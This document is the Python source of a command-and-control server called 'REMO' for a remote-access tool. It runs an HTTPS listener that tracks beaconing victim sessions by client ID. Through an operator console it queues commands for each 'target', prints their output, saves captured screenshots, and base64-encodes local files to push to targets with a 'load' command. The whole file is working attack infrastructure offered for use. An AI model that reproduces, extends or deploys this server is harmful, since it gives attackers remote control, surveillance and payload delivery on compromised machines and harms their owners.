import json
import ssl
import threading
import queue
import logging
import zlib
import base64
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

# Globals to keep track of sessions and session data
sessions          = {'0':0}
session_queues    = {'0':queue.Queue()}
session_commands  = {'0':[]}
selected_session = '0'

def bmp(data):
    d = json.loads(data)
    with open("D:\\bitmap.bmp", "wb") as f:
        f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))

class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override to log to a file instead of stdout
        logging.info("%s - - [%s] %s\n" %
                     (self.client_address[0],
                      self.log_date_time_string(),
                      format % args))
    def do_POST(self):
        global sessions
        global session_queues
        global session_commands
        
        clientid = self.headers.get("clientid")
        commands = self.headers.get("Commands")
        command = self.headers.get("command")
        
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        received = post_data
        response = b""
        # Got back a response from a command
        if (received != b"none"):
            print("[ {} ]".format(command))
            if command.startswith("screenshot"):
                print("Received screenshot!")
                bmp(received)
            else:
                for line in str(received)[2:-1].split("\\n"):
                    print(line)

        if clientid:
            if clientid not in sessions:
                print("\n[+] Adding clientid: {}".format(clientid))
                sessions[clientid] = 0
                session_queues[clientid] = queue.Queue()
                session_commands[clientid] = commands.split() if commands else []
           
            sessions[clientid] += 1
            session_commands[clientid] = commands.split() if commands else []
            if not session_queues[clientid].empty():
                response = session_queues[clientid].get()
                print("sending command:", response[:256])
                if not isinstance(response, bytes):
                    response = response.encode()
        else:
            print("client missing")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)


def run_server(server_class=HTTPServer, handler_class=CustomHTTPRequestHandler, port=443):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    
    # Load SSL context
    #httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="key.pem", certfile='cert.pem', server_side=True)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("cert.pem",keyfile="key.pem")
    httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)
    
    print(f'Serving HTTPS on port {port}...')
    httpd.serve_forever()

def user_interface():
    global selected_session
    global session_commands
    global session_queues
    
    while True:
        display_block  = "\n[ === === === REMO === === === ]\n"
        if selected_session != '0':
            display_block += "[  bg|background, " + ', '.join(session_commands[selected_session]) + "\n"
            display_block += "[ Queued for target:\n"
            with session_queues[selected_session].mutex:
                for i,item in enumerate(list(session_queues[selected_session].queue)):
                    display_block += f"[  <{i}> {item}\n"
        else:
            display_block += "[ Available sessions:\n"
            for i in range(0, len(sessions.keys()), 3):
                display_block += "[    " + ' '.join(list(sessions.keys())[i:i+3]) + "\n"
            display_block += "[ Commands:\n"
            display_block += "[  select <clientid>\n"
            display_block += "[  exit\n"

        display_block += "[{}]> ".format(selected_session if selected_session != '0' else "no session")
        command = input(display_block)

        # builtin commands            
        if command in ['bg', 'background']:
            selected_session = '0'
        elif command.startswith('select'):
            clientid = command.split(' ')[1]
            if clientid in sessions:
                selected_session = clientid
            else:
                print(f'[!] Session {clientid} does not exist.')
        elif command == 'exit':
            return
        # invalid commands
        elif len(command.strip()) < 2:
            pass
        # Valid command to send to target
        elif command.split()[0].strip() in session_commands[selected_session]:
            if command.startswith("load"):
                file = command.split()[-1]
                with open(file, "rb") as f:
                    data = f.read()
                command = "load " + base64.b64encode(data).decode()
            session_queues[selected_session].put(command)
            print(f'Queued data for session {selected_session}.')


if __name__ == "__main__":
    print(""" _______    ________ ____    ____   ___    
|_   __ \  |_   __  |_   \  /   _|.'   `.  
  | |__) |   | |_ \_| |   \/   | /  .-.  \ 
  |  __ /    |  _| _  | |\  /| | | |   | | 
 _| |  \ \_ _| |__/ |_| |_\/_| |_\  `-'  / 
|____| |___|________|_____||_____|`.___.'  
                                           """)
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    
    time.sleep(1) # Let the server startup before presenting interface
    user_interface()